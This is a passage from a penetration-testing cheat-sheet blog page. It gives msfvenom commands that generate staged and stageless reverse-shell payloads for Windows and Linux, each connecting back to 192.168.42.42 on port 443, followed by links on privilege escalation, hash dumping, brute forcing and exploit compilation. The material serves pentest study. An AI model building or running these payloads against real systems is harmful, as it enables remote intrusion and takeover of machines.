<pre><code class="language-console" data-lang="console"> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
</code></pre><h4 id="windows-stageless-reverse-tcp">Windows stageless reverse TCP</h4>
<pre><code class="language-console" data-lang="console">msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o &lt;output_name.format&gt;
</code></pre><h4 id="linux-staged-reverse-tcp">Linux staged reverse TCP</h4>
<pre><code class="language-console" data-lang="console">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
</code></pre><h4 id="linux-staged-reverse-tcp-1">Linux staged reverse TCP</h4>
<pre><code class="language-console" data-lang="console">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
</code></pre><h2 id="usefull-links">Usefull links</h2>
<h3 id="privilege-escalation">Privilege escalation</h3>
<h4 id="linux">Linux</h4>
<ul>
<li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation</a></li>
<li><a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
<li><a href="https://www.win.tue.nl/~aeb/linux/hh/hh-8.html">https://www.win.tue.nl/~aeb/linux/hh/hh-8.html</a></li>
<li><a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm</a></li>
</ul>
<h4 id="windows">Windows</h4>
<ul>
<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a></li>
<li><a href="https://github.com/ankh2054/windows-pentest">https://github.com/ankh2054/windows-pentest</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
<li><a href="https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html">https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html</a></li>
</ul>
<h3 id="misc">Misc</h3>
<h4 id="windows-1">Windows</h4>
<ul>
<li><a href="http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf">http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf</a></li>
<li><a href="https://www.lemoda.net/windows/windows2unix/windows2unix.html">https://www.lemoda.net/windows/windows2unix/windows2unix.html</a></li>
<li><a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html</a></li>
</ul>
<h4 id="linux-1">Linux</h4>
<ul>
<li><a href="http://www.pathname.com/fhs/pub/fhs-2.3.html">http://www.pathname.com/fhs/pub/fhs-2.3.html</a></li>
<li><a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys</a></li>
<li><a href="http://www.linusakesson.net/programming/tty/">http://www.linusakesson.net/programming/tty/</a></li>
<li><a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">http://pentestmonkey.net/blog/post-exploitation-without-a-tty</a></li>
</ul>
<h3 id="brute-force">Brute force</h3>
<ul>
<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
</ul>
<h3 id="compiling-exploits">Compiling exploits</h3>
<ul>
<li><a href="https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage">https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage</a></li>
<li><a href="https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html">https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html</a></li>
</ul>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="https://ceso.github.io/posts/2020/02/hack-the-box-ai/">
                  <span class="button__text">Hack The Box - AI</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    <script src="https://utteranc.es/client.js"
        repo="ceso/blog-source"
        issue-term="title"
        label="comments :speech_balloon:"
        theme="github-dark"
        crossorigin="anonymous"
        async>
</script>

    
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

<a href="javascript:" id="return-to-top"><i class="icon-chevron-up"></i></a>


<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">



  </div>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
            <span></span>
            <span> <a href="https://ceso.github.io/" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Theme made by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="https://ceso.github.io/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>


	
		<script src="https://ceso.github.io/js/scroll.js"></script>
	


    </body>
</html>
